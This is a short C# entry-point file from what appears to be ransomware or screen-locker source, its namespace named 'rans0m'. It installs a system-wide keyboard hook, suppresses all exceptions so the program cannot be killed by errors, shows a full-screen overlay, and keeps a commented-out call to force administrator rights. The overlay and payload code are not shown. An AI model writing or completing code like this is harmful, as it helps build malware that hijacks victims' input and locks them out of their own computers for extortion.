namespace rans0m
{
    internal static class Program
    {
        private static KeyboardHook keyboardHook = new KeyboardHook();

        [STAThread]
        static void Main()
        {
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            Application.ThreadException += (sender, e) => { }; // don't let a random exception kill the whole app

            ApplicationConfiguration.Initialize();
            // Global.AttemptForceAdmin(); Disabled for now, cause when the app is run as admin, it won't be able to accept drag&drop

            keyboardHook.KeyPressed += Global.KeyPressed;
            keyboardHook.Hook();

            Application.Run(new Overlay());

            keyboardHook.Unhook();
        }
    }
}